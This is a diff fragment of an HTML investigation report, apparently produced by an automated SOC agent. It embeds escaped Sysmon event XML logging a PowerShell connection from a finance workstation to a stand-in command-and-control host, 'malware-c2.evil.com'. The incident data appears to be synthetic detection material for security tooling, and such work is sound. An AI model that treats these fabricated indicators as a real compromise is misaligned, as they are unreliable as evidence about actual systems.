+      &lt;Provider Name=&#34;Microsoft-Windows-Sysmon&#34; Guid=&#34;{5770385F-C22A-43E0-BF4C-06F5698FFBD9}&#34;/&gt;
+      &lt;EventID&gt;3&lt;/EventID&gt;
+      &lt;Version&gt;5&lt;/Version&gt;
+      &lt;Level&gt;4&lt;/Level&gt;
+      &lt;Task&gt;3&lt;/Task&gt;
+      &lt;Opcode&gt;0&lt;/Opcode&gt;
+      &lt;Keywords&gt;0x8000000000000000&lt;/Keywords&gt;
+      &lt;TimeCreated SystemTime=&#34;2024-01-15T09:17:43.682Z&#34;/&gt;
+      &lt;EventRecordID&gt;98202&lt;/EventRecordID&gt;
+      &lt;Correlation/&gt;
+      &lt;Execution ProcessID=&#34;2844&#34; ThreadID=&#34;3160&#34;/&gt;
+      &lt;Channel&gt;Microsoft-Windows-Sysmon/Operational&lt;/Channel&gt;
+      &lt;Computer&gt;FINANCE-WS04.corp.acme.local&lt;/Computer&gt;
+      &lt;Security UserID=&#34;S-1-5-21-3541430928-2051711210-1391384369-1147&#34;/&gt;
+    &lt;/System&gt;
+    &lt;EventData&gt;
+      &lt;Data Name=&#34;RuleName&#34;&gt;technique_id=T1071.001,technique_name=Web Protocols&lt;/Data&gt;
+      &lt;Data Name=&#34;UtcTime&#34;&gt;2024-01-15 09:17:43.671&lt;/Data&gt;
+      &lt;Data Name=&#34;ProcessGuid&#34;&gt;{C4D396A1-82FA-65A5-3B07-000000001E00}&lt;/Data&gt;
+      &lt;Data Name=&#34;ProcessId&#34;&gt;5184&lt;/Data&gt;
+      &lt;Data Name=&#34;Image&#34;&gt;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe&lt;/Data&gt;
+      &lt;Data Name=&#34;User&#34;&gt;ACME\mthompson&lt;/Data&gt;
+      &lt;Data Name=&#34;Protocol&#34;&gt;tcp&lt;/Data&gt;
+      &lt;Data Name=&#34;Initiated&#34;&gt;true&lt;/Data&gt;
+      &lt;Data Name=&#34;SourceIsIpv6&#34;&gt;false&lt;/Data&gt;
+      &lt;Data Name=&#34;SourceIp&#34;&gt;10.0.2.47&lt;/Data&gt;
+      &lt;Data Name=&#34;SourceHostname&#34;&gt;FINANCE-WS04.corp.acme.local&lt;/Data&gt;
+      &lt;Data Name=&#34;SourcePort&#34;&gt;52841&lt;/Data&gt;
+      &lt;Data Name=&#34;SourcePortName&#34;/&gt;
+      &lt;Data Name=&#34;DestinationIsIpv6&#34;&gt;false&lt;/Data&gt;
+      &lt;Data Name=&#34;DestinationIp&#34;&gt;198.51.100.73&lt;/Data&gt;
+      &lt;Data Name=&#34;DestinationHostname&#34;&gt;malware-c2.evil.com&lt;/Data&gt;
+      &lt;Data Name=&#34;DestinationPort&#34;&gt;80&lt;/Data&gt;
+      &lt;Data Name=&#34;DestinationPortName&#34;&gt;http&lt;/Data&gt;
+    &lt;/EventData&gt;
+  &lt;/Event&gt;
+
+  &lt;Event xmlns=&#34;http://schemas.microsoft.com/win/2004/08/events/event&#34;&gt;
+    &lt;System&gt;
+      &lt;Provider Name=&#34;Microsoft-Windows-Sysmon&#34; Guid=&#34;{5770385F-C22A-43E0-BF4C-06F5698FFBD9}&#34;/&gt;
+      &lt;EventID&gt;11&lt;/EventID&gt;
+      &lt;Version&gt;2&lt;/Version&gt;
+      &lt;Level&gt;4&lt;/Level&gt;
+      &lt;Task&gt;11&lt;/Task&gt;
+      &lt;Opcode&gt;0&lt;/Opcode&gt;
+      &lt;Keywords&gt;0x8000000000000000&lt;/Keywords&gt;
+      &lt;TimeC</div>
+        </div>
+
+        <div class="footer">
+            Generated by SOC-AI-Agent | Automated Security Investigation Platform<br>
+            Report generated at 2026-02-13 04:13:54 UTC
+        </div>
+    </div>
+</body>
+</html>
